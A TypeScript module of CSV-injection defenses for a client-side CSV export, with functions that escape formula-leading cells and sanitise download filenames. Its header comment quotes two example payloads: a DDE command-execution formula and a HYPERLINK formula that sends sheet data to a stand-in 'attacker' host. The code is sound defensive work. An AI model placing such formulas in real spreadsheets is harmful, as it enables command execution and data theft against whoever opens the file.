/**
 * CSV-injection defenses for files this app generates in the browser.
 *
 * The Conversion tab builds a CSV entirely client-side and hands it straight
 * to a download — it never touches the backend, so the backend's export
 * sanitization can't cover it. A cell whose text starts with `=`, `+`, `-`,
 * `@`, a tab or a carriage return is read as a formula by Excel and Google
 * Sheets, which is enough to run DDE (`=cmd|'/c calc'!A0`) or quietly
 * exfiltrate the sheet (`=HYPERLINK("http://attacker/?"&A1,"x")`).
 *
 * Prefixing with an apostrophe is the standard neutralizer: spreadsheets read
 * it as "treat the rest as literal text" and don't display it.
 */

const FORMULA_PREFIXES = ["=", "+", "-", "@", "\t", "\r"]

/** Neutralizes a single cell's formula-injection potential. */
export function sanitizeCsvCell(value: string): string {
  if (!value) return value
  if (FORMULA_PREFIXES.some((prefix) => value.startsWith(prefix))) {
    return `'${value}`
  }
  return value
}

/**
 * Renders one CSV field: neutralize first, then quote.
 *
 * Order matters. Quoting first and sanitizing after would put the apostrophe
 * outside the quotes, where it corrupts the field instead of escaping it.
 */
export function toCsvField(value: unknown, delimiter: string): string {
  if (value === null || value === undefined) return ""

  const sanitized = sanitizeCsvCell(String(value))

  if (sanitized.includes(delimiter) || sanitized.includes('"') || /[\n\r]/.test(sanitized)) {
    return `"${sanitized.replace(/"/g, '""')}"`
  }
  return sanitized
}

/**
 * Strips a user-supplied name down to something safe to use as a download
 * filename. Browsers largely sanitize `a.download` themselves, but a name
 * carrying path separators, control characters or a second extension is worth
 * refusing outright rather than trusting each browser to get it right.
 */
export function safeDownloadFilename(name: string, fallback = "dataset.csv"): string {
  if (typeof name !== "string") return fallback

  const base = name.replace(/\\/g, "/").split("/").pop() ?? ""
  const cleaned = base
    // Control characters and anything that steers a filesystem write.
    .replace(/[^A-Za-z0-9._ -]/g, "_")
    .replace(/^[. ]+|[. ]+$/g, "")

  if (!cleaned) return fallback

  const withExtension = cleaned.toLowerCase().endsWith(".csv") ? cleaned : `${cleaned}.csv`
  return withExtension.slice(0, 120)
}
